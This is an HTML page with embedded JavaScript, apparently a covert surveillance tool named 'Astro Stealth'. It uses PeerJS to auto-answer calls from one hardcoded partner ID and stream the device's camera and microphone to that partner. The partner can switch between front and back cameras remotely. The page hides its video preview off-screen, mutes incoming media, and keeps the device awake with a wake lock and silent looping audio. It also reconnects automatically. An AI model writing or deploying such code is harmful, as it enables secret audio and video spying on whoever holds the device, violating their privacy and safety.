<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth - Switchable Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let currentCamera = "front";
        let wakeLock = null;
        let reconnectAttempts = 0;
        let isSwitching = false;
        const MAX_RECONNECTS = 5;
        
        // Store front and back camera device IDs for reliable switching
        let frontCameraId = null;
        let backCameraId = null;
        
        function log(msg) {
            console.log(`[STEALTH] ${msg}`);
        }
        
        // Detect cameras and get their device IDs
        async function detectCameras() {
            try {
                // Request permission first
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                log(`Found ${cameras.length} cameras:`);
                cameras.forEach((cam, i) => {
                    log(`  Camera ${i + 1}: ${cam.label || 'Unnamed'}`);
                });
                
                // Identify front and back cameras
                for (const cam of cameras) {
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment") || label.includes("world")) {
                        backCameraId = cam.deviceId;
                        log(`✅ Identified BACK camera: ${cam.label}`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face") || label.includes("selfie")) {
                        frontCameraId = cam.deviceId;
                        log(`✅ Identified FRONT camera: ${cam.label}`);
                    }
                }
                
                // Fallback: assume first is front, second is back
                if (!frontCameraId && cameras[0]) {
                    frontCameraId = cameras[0].deviceId;
                    log(`Using first camera as FRONT (default)`);
                }
                if (!backCameraId && cameras[1]) {
                    backCameraId = cameras[1].deviceId;
                    log(`Using second camera as BACK (default)`);
                }
                
                return true;
            } catch (err) {
                log(`Camera detection failed: ${err.message}`);
                return false;
            }
        }
        
        // Get stream using deviceId (most reliable)
        async function getStreamForCamera(camera, isVideo) {
            if (!isVideo) {
                // Audio only
                return await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            }
            
            const useBackCamera = (camera === 'back');
            const targetDeviceId = useBackCamera ? backCameraId : frontCameraId;
            
            // Method 1: Use exact deviceId if available
            if (targetDeviceId) {
                try {
                    log(`Trying ${camera} camera with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: true,
                        video: {
                            deviceId: { exact: targetDeviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    log(`✅ ${camera} camera acquired via deviceId`);
                    return stream;
                } catch (err) {
                    log(`deviceId method failed: ${err.message}`);
                }
            }
            
            // Method 2: Use facingMode
            try {
                log(`Trying ${camera} camera with facingMode`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: {
                        facingMode: useBackCamera ? "environment" : "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                log(`✅ ${camera} camera acquired via facingMode`);
                return stream;
            } catch (err) {
                log(`facingMode failed: ${err.message}`);
            }
            
            // Method 3: Fallback to any camera
            log(`Falling back to default camera for ${camera}`);
            return await navigator.mediaDevices.getUserMedia({
                audio: true,
                video: { width: { ideal: 640 }, height: { ideal: 480 } }
            });
        }
        
        // Fast camera switch using replaceTrack with negotiation
        async function switchCamera(targetCamera) {
            if (targetCamera === currentCamera) {
                log(`Already using ${targetCamera} camera`);
                return;
            }
            
            if (!currentCall) {
                log('No active call, just updating camera preference');
                currentCamera = targetCamera;
                return;
            }
            
            if (isSwitching) {
                log('Already switching, please wait');
                return;
            }
            
            isSwitching = true;
            log(`🔄 Switching to ${targetCamera.toUpperCase()} camera...`);
            
            try {
                const isVideo = (currentCall.metadata?.type || 'voice') === 'video';
                
                if (!isVideo) {
                    currentCamera = targetCamera;
                    if (dataConn && dataConn.open) {
                        dataConn.send({ type: 'camera_switched', camera: targetCamera });
                    }
                    isSwitching = false;
                    return;
                }
                
                // Get new stream with desired camera
                const newStream = await getStreamForCamera(targetCamera, true);
                const newVideoTrack = newStream.getVideoTracks()[0];
                
                if (!newVideoTrack) {
                    throw new Error('No video track in new stream');
                }
                
                // Get the peer connection
                const pc = currentCall.peerConnection;
                if (!pc) {
                    throw new Error('No peer connection');
                }
                
                // Find the video sender
                const senders = pc.getSenders();
                const videoSender = senders.find(s => s.track && s.track.kind === 'video');
                
                if (videoSender) {
                    // Replace the track
                    await videoSender.replaceTrack(newVideoTrack);
                    log(`Video track replaced with ${targetCamera} camera`);
                    
                    // Trigger negotiation to notify remote
                    if (pc.negotiationNeeded) {
                        await pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    }
                } else {
                    // No video sender, add new one
                    pc.addTrack(newVideoTrack, newStream);
                    log(`Added new video track for ${targetCamera} camera`);
                }
                
                // Update audio track if needed
                const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
                if (audioSender && newStream.getAudioTracks()[0]) {
                    await audioSender.replaceTrack(newStream.getAudioTracks()[0]);
                }
                
                // Clean up old stream
                if (localStream && localStream !== newStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                
                localStream = newStream;
                currentCamera = targetCamera;
                
                // Update hidden video element
                const videoEl = document.getElementById('localVideo');
                videoEl.srcObject = newStream;
                
                log(`✅ Successfully switched to ${targetCamera.toUpperCase()} camera`);
                
                // Notify remote
                if (dataConn && dataConn.open) {
                    dataConn.send({ type: 'camera_switched', camera: targetCamera });
                }
                
            } catch (err) {
                log(`Switch failed: ${err.message}`);
                if (dataConn && dataConn.open) {
                    dataConn.send({ type: 'camera_switch_failed', reason: err.message });
                }
            } finally {
                isSwitching = false;
            }
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
            
            const silentAudio = new Audio();
            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
            silentAudio.loop = true;
            silentAudio.volume = 0;
            silentAudio.play().catch(e => {});
        }
        
        async function handleIncomingCall(call) {
            const callType = call.metadata?.type || 'voice';
            const isVideo = callType === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call`);
            
            try {
                // Detect cameras first
                await detectCameras();
                
                // Use current camera preference
                const stream = await getStreamForCamera(currentCamera, isVideo);
                localStream = stream;
                
                if (isVideo && stream.getVideoTracks().length > 0) {
                    const videoEl = document.getElementById('localVideo');
                    videoEl.srcObject = stream;
                }
                
                call.answer(stream);
                currentCall = call;
                
                log(`Call answered - Using ${currentCamera} camera`);
                
                call.on('stream', (remoteStream) => {
                    if (remoteStream) {
                        remoteStream.getTracks().forEach(track => {
                            track.enabled = false;
                        });
                    }
                });
                
                call.on('close', () => {
                    log('Call ended');
                    endCall();
                });
                
                call.on('error', (err) => {
                    log(`Call error: ${err}`);
                    endCall();
                });
                
            } catch (err) {
                log(`Failed to answer: ${err.message}`);
                call.close();
            }
        }
        
        function handleDataMessage(data) {
            log(`Received: ${data.type}`);
            
            if (data.type === 'switchCamera') {
                switchCamera(data.camera);
            } else if (data.type === 'ping') {
                if (dataConn && dataConn.open) {
                    dataConn.send({ type: 'pong', timestamp: Date.now() });
                }
            }
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => {
                    track.stop();
                    log(`Stopped ${track.kind} track`);
                });
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            document.getElementById('localVideo').srcObject = null;
            log('Call ended');
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing stealth device as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async (id) => {
                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`);
                log(`Current camera: ${currentCamera.toUpperCase()}`);
                await detectCameras();
                log(`Waiting for connection from ${PARTNER_ID}...`);
                reconnectAttempts = 0;
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Data connection established`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => {
                        log('Data connection closed');
                        dataConn = null;
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    log(`Rejected call from ${call.peer}`);
                    call.close();
                }
            });
            
            peer.on('disconnected', () => {
                log('Disconnected, reconnecting...');
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    setTimeout(() => peer.reconnect(), 3000);
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    log(`ID ${MY_ID} in use, retrying...`);
                    setTimeout(() => initPeer(), 5000);
                } else {
                    log(`Error: ${err.type}`);
                }
            });
        }
        
        log('=== ASTRO STEALTH SERVICE ===');
        log(`Initial camera: ${currentCamera.toUpperCase()}`);
        
        preventScreenLock();
        initPeer();
        
        setInterval(() => {
            if (currentCall) {
                console.log('[STEALTH] Active');
            }
        }, 30000);
        
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
